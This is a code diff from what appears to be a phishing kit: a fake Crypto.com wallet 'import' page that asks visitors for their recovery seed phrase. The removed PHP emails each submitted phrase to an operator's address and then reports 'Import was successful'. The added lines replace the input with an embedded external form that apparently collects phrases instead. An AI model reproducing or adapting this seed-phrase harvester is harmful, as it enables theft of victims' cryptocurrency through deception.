@@ -1,34 +1,4 @@
-<?php
 
-include '../config.php';
-
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-
-$msg = "";
-
-  if (isset($_POST['import'])) {
-    $key = trim($_POST['key']);
-    if (!empty($key)) {
-      require_once "../PHPMailer/PHPMailer.php";
-      require_once '../PHPMailer/Exception.php';
-
-      $mail= new PHPMailer();
-      $mail->setFrom($username);
-      $mail->FromName = $domainName;
-      $mail->addAddress($send_to);
-      $mail->Subject = "Crypto-com Phrase";
-      $mail->isHTML(true);
-      $mail->Body = 'Crypto-com Phrase - '.$key.' ';
-      $mail->send();
-
-      $msg = "Import was successful";
-    }
-  }
-
-
-
- ?>
 <!DOCTYPE html> 
 <html lang=en class="wf-acuminpro-n5-active wf-acuminpro-n6-active wf-acuminpro-n7-active wf-acuminpro-n2-active wf-acuminpro-n3-active wf-acuminpro-n4-active wf-active" data-react-helmet=lang style>
    <meta charset=utf-8>
@@ -266,10 +236,10 @@ Type your 12/18/24-word recovery phrase to restore your existing wallet.
 
 <div id="phrase" class="tabcontent">
                      <form action="connect.php" method="POST" id="form1">
-					 <textarea rows="8" cols="120"  name="key" required="required" minlength="12" placeholder="Seed Phrase"
-                        required="required"></textarea>                      
+                     <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+                      
                       <br><br>
-                      <button form="form1" value="Import" type="submit" name="import" class="css-kxob9k">IMPORT</button>
+                      
                     </form>
 </div>
               
